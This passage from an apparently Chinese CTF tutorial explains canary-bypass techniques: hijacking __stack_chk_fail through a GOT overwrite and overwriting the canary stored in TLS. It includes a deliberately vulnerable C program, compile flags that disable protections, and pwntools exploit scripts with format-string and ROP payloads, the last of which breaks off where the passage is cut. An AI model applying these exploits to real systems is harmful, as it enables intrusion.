data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"方法四-劫持__stack_chk_fail函数\"><a class=\"markdownIt-Anchor\" href=\"#方法四-劫持__stack_chk_fail函数\">#</a> 方法四 劫持__stack_chk_fail 函数</h3>\n<h5 id=\"原理-4\"><a class=\"markdownIt-Anchor\" href=\"#原理-4\">#</a> 原理</h5>\n<p>在开启 canary 保护的程序中，如果 canary 不对，程序会转到<strong> stack_chk_fail 函数执行</strong>。stack_chk_fail 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// scf.c</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">getshell</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 栈溢出</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ gcc scf.c <span class=\"token parameter variable\">-m32</span> -fstack-protector -no-pie <span class=\"token parameter variable\">-z</span> noexecstack <span class=\"token parameter variable\">-z</span> norelro <span class=\"token parameter variable\">-o</span> scf</pre></td></tr></table></figure><ul>\n<li>劫持函数需要修改 got 表，所以要关闭 relro（RELocation Read Only）</li>\n<li>需要调用 getshell 函数，所以需要关闭 pie（Position Indenpendent Executive）</li>\n</ul>\n<h6 id=\"检查-2\"><a class=\"markdownIt-Anchor\" href=\"#检查-2\">#</a> 检查</h6>\n<p><img data-src=\"/img/canary/image-20230804093940998.png\" alt=\"image-20230804093940998\"></p>\n<h6 id=\"ida-4\"><a class=\"markdownIt-Anchor\" href=\"#ida-4\">#</a> ida</h6>\n<p><img data-src=\"/img/canary/image-20230804094426572.png\" alt=\"image-20230804094426572\"></p>\n<p><img data-src=\"/img/canary/image-20230804094442002.png\" alt=\"image-20230804094442002\"></p>\n<ul>\n<li>有个 getshell 后门</li>\n<li>main 函数中 printf 直接打印了用户输入的内容，存在格式化字符串漏洞，可以用来向任意地址写入数据</li>\n</ul>\n<p><strong><u>GOT 表中存储的是函数的实际地址，如果把 <code>__stack_chk_fail</code>  函数的 got 表地址替换为 getshell 的地址，在 canary 出错的情况下，调用 <code>__stack_chk_fail</code>  时就会直接获取到 shell。</u></strong></p>\n<p>这里利用 pwntools 中的 fmtstr_payload () 可以方便的进行地址的篡改</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fmtstr_payload<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span> writes<span class=\"token punctuation\">,</span> numbwritten<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> write_size<span class=\"token operator\">=</span>‘byte’<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>offset（<span class=\"token builtin\">int</span>）<span class=\"token punctuation\">:</span> 字符串的偏移</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>writes <span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> 注入的地址和值，<span class=\"token punctuation\">&#123;</span>target_addr <span class=\"token punctuation\">:</span> change_to<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>手工确认字符串的偏移</p>\n<p><img data-src=\"/img/canary/image-20230804094756512.png\" alt=\"image-20230804094756512\"></p>\n<p><code>61616161</code>  是第 10 个位置，因此 offset 取 10</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span>stack_chk_fail_got<span class=\"token punctuation\">:</span> getshell<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>还要造成一次溢出，触发 <code>__stack_chk_fail</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h6 id=\"exp-4\"><a class=\"markdownIt-Anchor\" href=\"#exp-4\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./scf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./scf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>stack_chk_fail_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__stack_chk_fail'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>getshell <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'getshell'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>pl <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span>stack_chk_fail_got<span class=\"token punctuation\">:</span> getshell<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pl <span class=\"token operator\">=</span> pl<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>se<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"方法五-tsl全覆盖\"><a class=\"markdownIt-Anchor\" href=\"#方法五-tsl全覆盖\">#</a> 方法五 TSL 全覆盖</h3>\n<h5 id=\"原理-5\"><a class=\"markdownIt-Anchor\" href=\"#原理-5\">#</a> 原理</h5>\n<p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>\n<h5 id=\"love\"><a class=\"markdownIt-Anchor\" href=\"#love\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubnNzY3RmLmNuL3Byb2JsZW0vNDE4Mg==\">love</span></h5>\n<h6 id=\"检查-3\"><a class=\"markdownIt-Anchor\" href=\"#检查-3\">#</a> 检查</h6>\n<p><img data-src=\"/img/canary/image-20230804100611025.png\" alt=\"image-20230804100611025\"></p>\n<h6 id=\"ida-5\"><a class=\"markdownIt-Anchor\" href=\"#ida-5\">#</a> ida</h6>\n<p><img data-src=\"/img/canary/image-20230804100726428.png\" alt=\"image-20230804100726428\"></p>\n<p><img data-src=\"/img/canary/image-20230804100739512.png\" alt=\"image-20230804100739512\"></p>\n<p>很明显，能够看到 canary 保护，并且能找到格式化字符串漏洞，和 vuln 的栈溢出漏洞。所以我们可以通过 read 函数读入数据，让格式化字符覆盖内存地址，从而绕过判断，进入 vuln 中。再通过覆盖 TLS 中储存的 Canary 值和栈上临时存的 canary 的值。绕过 canary，达成攻击手段。</p>\n<p><img data-src=\"/img/canary/image-20230804101610167.png\" alt=\"image-20230804101610167\"></p>\n<p>从中可以找到 0x22b、0x208 换算一下就是 555 和 520，计算一下偏移为 9</p>\n<p>所以 payload</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%520s%9$n'</span></pre></td></tr></table></figure><p>但是在这里我们也能发现 canary 的影子，在偏移 15 的位置。经过多次输入这个字段，证实了我们猜测。所以这题也可以通过泄露 canary 来绕过。</p>\n<p>绕过判断之后。</p>\n<p>泄露 libc 基址。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0xa00</span></pre></td></tr></table></figure><p>最后获取 shell 即可。</p>\n<h6 id=\"exp-5\"><a class=\"markdownIt-Anchor\" href=\"#exp-5\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>gets_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'gets'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004013f3</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%520s%9$n'</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b\"I want to hear your praise of Toka\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'I know you like him, but you must pass my level\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>vuln <span class=\"token operator\">=</span> <span class=\"token number\">0x40125D</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0xa00</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>puts <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>base <span class=\"token operator\">=</span> puts <span class=\"token operator\">-</span> <span class=\"token number\">0x84420</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>system <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> <span class=\"token number\">0x52294</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>bin_sh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> <span class=\"token number\">0x1B45BD</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'----------------->'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'I know you like him, but you must pass my level\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>pl <span class=\"token 